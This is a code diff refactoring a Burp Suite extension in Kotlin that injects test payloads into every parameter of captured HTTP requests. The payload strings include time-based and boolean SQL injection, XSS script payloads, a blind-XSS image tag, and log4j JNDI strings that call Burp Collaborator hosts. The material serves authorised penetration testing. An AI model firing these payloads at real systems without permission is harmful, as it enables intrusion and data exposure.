@@ -21,12 +21,6 @@ import java.awt.event.ActionEvent
 import java.util.concurrent.Executors
 import javax.swing.JMenuItem
 
-enum class PayloadType {
-    REPLACE,
-    MIDDLE,
-    BEGINNING,
-    END
-}
 
 class EveryParameter : BurpExtension, ContextMenuItemsProvider {
 
@@ -120,90 +114,90 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
     fun sqliQuickActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadType.END, "SQLi Polyglot \"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadUpdateMode.APPEND, "SQLi Polyglot \"")
         logger.debugLog("Exit")
     }
 
     fun sqliLogicPayloadsActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadType.END, "SQLi boolean a'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadType.END, "SQLi boolean 1'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadType.END, "SQLi boolean a\"")
-        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadType.END, "SQLi boolean 1\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadUpdateMode.APPEND, "SQLi boolean a'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadUpdateMode.APPEND, "SQLi boolean 1'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadUpdateMode.APPEND, "SQLi boolean a\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadUpdateMode.APPEND, "SQLi boolean 1\"")
         logger.debugLog("Exit")
     }
 
     fun sqliConcatPayloadsActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'+'",PayloadType.MIDDLE, "SQLi concat +'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'||'",PayloadType.MIDDLE, "SQLi concat ||'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"' '",PayloadType.MIDDLE, "SQLi concat space'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"+\"",PayloadType.MIDDLE, "SQLi concat +\"")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"||\"",PayloadType.MIDDLE, "SQLi concat ||\"")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\" \"",PayloadType.MIDDLE, "SQLi concat space\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'+'",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat +'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'||'",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat ||'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"' '",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat space'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"+\"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat +\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"||\"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat ||\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\" \"",PayloadUpdateMode.INSERT_MIDDLE, "SQLi concat space\"")
         logger.debugLog("Exit")
     }
 
     fun sqliSingleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'-- ",PayloadType.END, "SQLi comment'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"')-- ",PayloadType.END, "SQLi comment)'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'-- ",PayloadUpdateMode.APPEND, "SQLi comment'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"')-- ",PayloadUpdateMode.APPEND, "SQLi comment)'")
         logger.debugLog("Exit")
     }
 
     fun sqliDoubleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"-- ",PayloadType.END, "SQLi comment'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\")-- ",PayloadType.END, "SQLi comment)'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"-- ",PayloadUpdateMode.APPEND, "SQLi comment'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\")-- ",PayloadUpdateMode.APPEND, "SQLi comment)'")
         logger.debugLog("Exit")
     }
 
     fun sqliErrorPayloadsActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"",PayloadType.END, "SQLi '\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"",PayloadUpdateMode.APPEND, "SQLi '\"")
         logger.debugLog("Exit")
     }
 
     fun xssMapActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\">asdf",PayloadType.END, "XSS asdf")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\">asdf",PayloadUpdateMode.APPEND, "XSS asdf")
         logger.debugLog("Exit")
     }
 
     fun blindXssImgActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><img src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/blindimg.png\">asdf",PayloadType.END, "Bind XSS Img")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><img src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/blindimg.png\">asdf",PayloadUpdateMode.APPEND, "Bind XSS Img")
         logger.debugLog("Exit")
     }
 
     fun collabUrlActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/collaburl",PayloadType.REPLACE, "Collab URL")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/collaburl",PayloadUpdateMode.REPLACE, "Collab URL")
         logger.debugLog("Exit")
     }
 
     fun log4jCollabActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:ldap://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadType.REPLACE, "log4j ldap")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:dns://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadType.REPLACE, "log4j dns")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:ldap://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j ldap")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:dns://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j dns")
         logger.debugLog("Exit")
     }
 
     fun xssPayloadsActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><h2>heading here</h2>asdfh2",PayloadType.END, "XSS h2")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><script>alert(1)</script>asdfalert",PayloadType.END, "XSS Alert")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadType.END, "XSS UTF7")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><h2>heading here</h2>asdfh2",PayloadUpdateMode.APPEND, "XSS h2")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><script>alert(1)</script>asdfalert",PayloadUpdateMode.APPEND, "XSS Alert")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadUpdateMode.APPEND, "XSS UTF7")
         logger.debugLog("Exit")
     }
 
@@ -245,11 +239,10 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
                                     currentRequest = modifiedRequest
                             }
                             else {
-                                val modifiedRequest = matchReplaceParameterInRequest(
-                                    currentRequest,
+                                val modifiedRequest =  currentRequest.withUpdatedParsedParameterValue(
                                     parameter,
                                     "",
-                                    PayloadType.REPLACE
+                                    PayloadUpdateMode.REPLACE
                                 )
                                 val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
                                 if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
@@ -265,7 +258,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
                     logger.errorLog("Skipping mimize request because it doesn't have a response to compare to")
             }
         }
-        //iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadType.END, "XSS UTF7")
+        //iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"＞＜script＞alert(1)＜/script＞asdfutf7",PayloadUpdateMode.APPEND, "XSS UTF7")
         logger.debugLog("Exit")
     }
 
@@ -282,7 +275,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
     }
 
 
-    fun iterateThroughParametersWithPayload(httpRequestResponses : List<HttpRequestResponse>, payload : String, payloadType : PayloadType, annotation : String)
+    fun iterateThroughParametersWithPayload(httpRequestResponses : List<HttpRequestResponse>, payload : String, payloadType : PayloadUpdateMode, annotation : String)
     {
         logger.debugLog("Enter")
         for(httpRequestResponse in httpRequestResponses)
@@ -343,8 +336,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
 
                         HttpParameterType.JSON ->
                             sendRequest(
-                                matchReplaceParameterInRequest(
-                                    httpRequest,
+                                httpRequest.withUpdatedParsedParameterValue(
                                     parameter,
                                     payload.replace("\"", "\\\""),
                                     payloadType
@@ -353,23 +345,21 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
 
                         HttpParameterType.XML -> {
                             sendRequest(
-                                matchReplaceParameterInRequest(
-                                    httpRequest,
+                                httpRequest.withUpdatedParsedParameterValue(
                                     parameter,
                                     api.utilities().htmlUtils().encode(payload),
                                     payloadType
                                 ), "URL XML: ${parameter.name()}: $annotation"
                             )
                             sendRequest(
-                                matchReplaceParameterInRequest(httpRequest, parameter, "<![CDATA[$payload]]>",payloadType),
+                                httpRequest.withUpdatedParsedParameterValue(parameter, "<![CDATA[$payload]]>",payloadType),
                                 "URL XML: ${parameter.name()}: $annotation"
                             )
                         }
 
                         HttpParameterType.XML_ATTRIBUTE ->
                             sendRequest(
-                                matchReplaceParameterInRequest(
-                                    httpRequest,
+                                    httpRequest.withUpdatedParsedParameterValue(
                                     parameter,
                                     api.utilities().htmlUtils().encode(payload),
                                     payloadType
@@ -392,7 +382,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         return HttpParameter.parameter(parsedParameter.name(),encodedPayload,parsedParameter.type())
     }*/
 
-    fun createUpdatedParameter(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadType) : HttpParameter {
+    fun createUpdatedParameter(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : HttpParameter {
         logger.debugLog("Enter")
         return HttpParameter.parameter(parsedParameter.name(), insertPayloadAccordingToType(parsedParameter,encodedPayload,payloadType), parsedParameter.type())
     }
@@ -401,6 +391,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         return originalRequest.withBody(originalRequest.bodyToString().replace(parsedParameter.value(),encodedPayload))
     }*/
 
+    /*
     fun matchReplaceParameterInRequest(originalRequest : HttpRequest ,parsedParameter : ParsedHttpParameter,encodedPayload : String, payloadType : PayloadType) : HttpRequest {
 
         //find updated parsed parameter
@@ -411,13 +402,13 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
             val requestAsString = originalRequest.toString()
 
             when (payloadType) {
-                PayloadType.BEGINNING -> {
+                PayloadUpdateMode.PREPEND -> {
                     val part1 = requestAsString.substring(0, updatedParsedParam.valueOffsets().startIndexInclusive())
                     val part2 = requestAsString.substring(updatedParsedParam.valueOffsets().startIndexInclusive() + 1)
                     return HttpRequest.httpRequest(originalRequest.httpService(), part1 + encodedPayload + part2)
                 }
 
-                PayloadType.MIDDLE -> {
+                PayloadUpdateMode.INSERT_MIDDLE -> {
                     val middleIndexDiff =
                         (updatedParsedParam.valueOffsets().endIndexExclusive() - updatedParsedParam.valueOffsets()
                             .startIndexInclusive()) / 2
@@ -436,7 +427,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
                     return HttpRequest.httpRequest(originalRequest.httpService(), part1 + encodedPayload + part2)
                 }
 
-                PayloadType.END -> {
+                PayloadUpdateMode.APPEND -> {
                     val part1 = requestAsString.substring(0, updatedParsedParam.valueOffsets().endIndexExclusive())
                     val part2 = requestAsString.substring(updatedParsedParam.valueOffsets().endIndexExclusive())
                     return HttpRequest.httpRequest(originalRequest.httpService(), part1 + encodedPayload + part2)
@@ -451,11 +442,11 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         }
         return originalRequest
     }
-
-    fun insertPayloadAccordingToType(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadType) : String {
+*/
+    fun insertPayloadAccordingToType(parsedParameter : ParsedHttpParameter,encodedPayload : String,payloadType : PayloadUpdateMode) : String {
         when (payloadType) {
-            PayloadType.BEGINNING -> return encodedPayload + parsedParameter.value()
-            PayloadType.MIDDLE -> {
+            PayloadUpdateMode.PREPEND -> return encodedPayload + parsedParameter.value()
+            PayloadUpdateMode.INSERT_MIDDLE -> {
                 val parsedParamValLength = parsedParameter.value().length
                 if (parsedParamValLength > 1) {
                     return parsedParameter.value()
@@ -465,7 +456,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
                 return encodedPayload + parsedParameter.value()
             }
 
-            PayloadType.END -> return parsedParameter.value() + encodedPayload
+            PayloadUpdateMode.APPEND -> return parsedParameter.value() + encodedPayload
             else -> return encodedPayload
         }
     }
@@ -483,16 +474,9 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
 
     fun sendRequestConsiderSettings(httpRequest : HttpRequest) : HttpRequestResponse {
         if(followRedirectSetting.currentValue)
-            return api.http().sendRequest(updateRequestContentLength(httpRequest),RequestOptions.requestOptions().withRedirectionMode(RedirectionMode.ALWAYS))
+            return api.http().sendRequestWithUpdatedContentLength(httpRequest,RequestOptions.requestOptions().withRedirectionMode(RedirectionMode.ALWAYS))
         else
-            return api.http().sendRequest(updateRequestContentLength(httpRequest))
-    }
-
-    fun updateRequestContentLength(httpRequest : HttpRequest) : HttpRequest {
-        if(httpRequest.hasHeader("Content-Length")) {
-            return httpRequest.withUpdatedHeader("Content-Length",httpRequest.body().length().toString())
-        }
-        return httpRequest
+            return api.http().sendRequestWithUpdatedContentLength(httpRequest)
     }
 
 }
